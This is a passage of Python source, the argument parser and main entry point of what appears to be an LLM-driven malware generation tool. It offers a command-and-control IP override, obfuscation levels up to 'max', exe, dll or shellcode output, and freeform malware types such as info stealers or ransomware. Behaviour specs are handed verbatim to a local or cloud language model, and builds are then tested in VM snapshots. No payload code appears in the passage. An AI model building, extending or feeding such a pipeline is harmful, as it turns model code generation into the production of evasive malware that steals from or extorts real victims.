    chunk_parser.add_argument("--snapshot", action="store_true", help="Use VM snapshot before testing")
    chunk_parser.add_argument("-o", "--output", default="results", help="Output directory (default: results)")
    chunk_parser.add_argument("--var", action="append", default=[], help="Override var: --var C2_IP=1.2.3.4")
    chunk_parser.add_argument("--obfuscate", choices=["none", "light", "heavy", "max"],
                              default="none", help="Source-level obfuscation (default: none)")
    chunk_parser.add_argument("--format", choices=["exe", "dll", "shellcode"], default="exe",
                              help="Output format (default: exe)")

    # -- analyze ------------------------------------------------------------
    ana_parser = subparsers.add_parser("analyze", help="Query DBs and show context without generating code")
    ana_parser.add_argument("--spec", required=True, help="Path to target spec")
    ana_parser.add_argument("--db-n", type=int, default=10, help="Number of results per DB query")
    ana_parser.add_argument(
        "--malware-type",
        default=None,
        help="Freeform description of malware behaviour (e.g. \"info stealer\", \"ransomware\"); overrides spec.yaml if set",
    )
    ana_parser.add_argument(
        "--behavior",
        default=None,
        metavar="SPEC",
        help="Detailed behavioral requirements passed verbatim to the LLM; overrides spec.yaml if set",
    )
    ana_parser.add_argument(
        "--mode", choices=["local-run", "cloud-run"], default="local-run",
        help="local-run: local LLM for everything (default). cloud-run: chunk code gen via Fugu/Sakana AI (requires FUGU_API_KEY).",
    )

    return parser


# ---------------------------------------------------------------------------
# Main entry point
# ---------------------------------------------------------------------------

def _validate_early(args) -> None:
    """Fail fast before any async work runs."""
    NEEDS_SPEC = {"generate", "verify", "run", "analyze"}
    NEEDS_MALWARE_TYPE = {"generate", "run", "analyze"}

    if args.command not in NEEDS_SPEC:
        return

    # -- spec file must exist ------------------------------------------------
    spec = getattr(args, "spec", None)
    if not spec:
        print(f"Error: --spec is required for the '{args.command}' command", file=sys.stderr)
        sys.exit(1)
    spec_path = Path(spec)
    if not spec_path.exists():
        print(f"Error: spec file not found: {spec}", file=sys.stderr)
        sys.exit(1)

    # -- malware_type must be set (CLI flag or inside the spec file) ---------
    if args.command not in NEEDS_MALWARE_TYPE:
        return

    if getattr(args, "malware_type", None):
        return  # provided via --malware-type

    # peek at the spec file
    mt_in_spec = None
    try:
        content = spec_path.read_text()
        if spec_path.suffix in (".yaml", ".yml"):
            try:
                import yaml as _yaml
                data = _yaml.safe_load(content) or {}
            except Exception:
                data = {}
        elif spec_path.suffix == ".json":
            try:
                data = json.loads(content)
            except Exception:
                data = {}
        else:
            data = {}
        mt_in_spec = data.get("malware_type") if isinstance(data, dict) else None
    except Exception:
        pass

    if not mt_in_spec:
        print(
            "Error: malware_type not specified — "
            "add 'malware_type: <type>' to your spec file "
            "or pass --malware-type on the command line",
            file=sys.stderr,
        )
        sys.exit(1)


def main():
    parser = build_parser()
    args = parser.parse_args()

    _validate_early(args)
    _setup_logging(args.verbose)

    command_map = {
        "generate":  cmd_generate,
        "provision": cmd_provision,
        "verify":    cmd_verify,
        "run":       cmd_run,
        "chunk":     cmd_chunk,
        "clean":     cmd_clean,
        "analyze":   cmd_analyze,
        "portal":    cmd_portal,
    }

    handler = command_map.get(args.command)
    if not handler:
        parser.print_help()
        sys.exit(1)

    logging.info("START command=%s args=%s", args.command, vars(args))
    try:
        exit_code = asyncio.run(handler(args))
        logging.info("DONE command=%s exit_code=%s", args.command, exit_code or 0)
        sys.exit(exit_code or 0)
    except KeyboardInterrupt:
        logging.info("INTERRUPTED command=%s", args.command)
        print("\nInterrupted.")
        sys.exit(130)
    except Exception as e:
        logging.error("FAILED command=%s error=%s", args.command, e, exc_info=True)
        sys.exit(2)


if __name__ == "__main__":
    main()
